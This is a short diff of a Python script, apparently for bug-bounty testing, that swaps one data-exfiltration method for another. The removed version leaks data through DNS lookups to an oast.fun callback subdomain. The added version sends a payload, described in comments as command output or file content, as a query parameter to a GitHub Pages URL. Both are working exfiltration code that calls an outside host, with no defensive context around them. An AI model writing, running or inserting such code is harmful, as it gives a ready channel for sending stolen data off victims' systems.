@@ -1,13 +1,13 @@
-import socket
+import requests
 
-def dns_query(data):
-    try:
-        # Construct a DNS query where the data is appended to the subdomain
-        query = f"{data}.yqyueeqdvtgsilyleffvzzvoowz6itl52.oast.fun" 
-        socket.getaddrinfo(query, None)
-    except Exception as e:
-        print(f"Error: {e}")
+# Define your GitHub Pages URL (with the payload as a query parameter)
+url = "https://vedanthackerone.github.io/bullfrog/?data="  # Use your GitHub Pages URL
 
-# Example data to exfiltrate
-data = "payload_data_or_command_output"
-dns_query(data)
+# Your payload data (this could be anything, e.g., command output or file content)
+payload = "example_payload_data"
+
+# Send the GET request with the payload
+response = requests.get(url + payload)
+
+# Print the status code (optional, for debugging)
+print(response.status_code)
